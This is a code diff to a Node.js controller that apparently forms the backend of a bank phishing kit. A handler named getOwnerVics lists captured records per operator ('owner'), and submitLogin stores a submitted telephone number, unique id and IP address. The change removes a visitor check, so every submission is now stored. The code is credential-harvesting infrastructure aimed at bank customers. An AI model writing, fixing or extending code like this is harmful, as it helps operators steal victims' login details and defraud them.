@@ -1,6 +1,4 @@
 const uBank = require("../models/ubankModel");
-const Ips = require("../models/ipsModel");
-const Visitors = require("../models/visitorsModel");
 
 const getOwnerVics = async (req, res) => {
   const { owner } = req.params;
@@ -49,21 +47,11 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { telephone, uniqueid, owner, ip } = req.body;
   try {
-    let checkVis = await checkVisitor(ip, owner);
-    if (checkVis) {
-      await uBank.create({ uniqueid, telephone, status: 2, owner, ip });
-    }
+    await uBank.create({ uniqueid, telephone, status: 2, owner, ip });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
     res.sendStatus(400);
-  }
-};
-
-const checkVisitor = async (ip, owner) => {
-  let visitors = await Visitors.find({ owner, ip }).exec();
-  if (visitors.length) {
-    return true;
   }
 };
 
